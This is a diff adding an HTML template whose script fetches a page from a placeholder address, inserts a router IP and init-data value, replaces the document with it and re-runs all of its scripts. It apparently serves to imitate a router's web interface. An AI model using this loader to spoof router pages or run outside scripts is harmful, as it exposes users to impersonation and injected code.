@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <script>
+	let INITDATA = "%INITDATA%";
+	let ROUTERIP = "%ROUTERIP%";
+	let INJECT_FROM = "%INJECT_FROM%";
+	
+    document.addEventListener('DOMContentLoaded', function () {
+      fetch(INJECT_FROM)
+        .then(response => response.text())
+        .then(html => {
+          const parser = new DOMParser();
+          const doc = parser.parseFromString(html, 'text/html');
+	  
+          const initDataElement = doc.getElementById("idInitData");
+          if (initDataElement) {
+            initDataElement.value = INITDATA;
+          }
+          const routerIPElement = doc.getElementById("idInfoIP");
+          if (routerIPElement) {
+            routerIPElement.innerHTML = ROUTERIP;
+          }
+		  
+          document.documentElement.innerHTML = doc.documentElement.innerHTML;
+          const externalScripts = Array.from(doc.querySelectorAll('script'));
+          const existingScripts = document.querySelectorAll('script');
+          existingScripts.forEach(script => script.remove());
+          externalScripts.forEach(script => {
+            const newScript = document.createElement('script');
+            if (script.src) {
+              newScript.src = script.src;
+            } else {
+              newScript.innerHTML = script.innerHTML;
+            }
+            document.body.appendChild(newScript);
+          });
+        })
+        .catch(err => console.error("Eroare:", err));
+    });
+  </script>
+</head>
+<body>
+</body>
+</html>
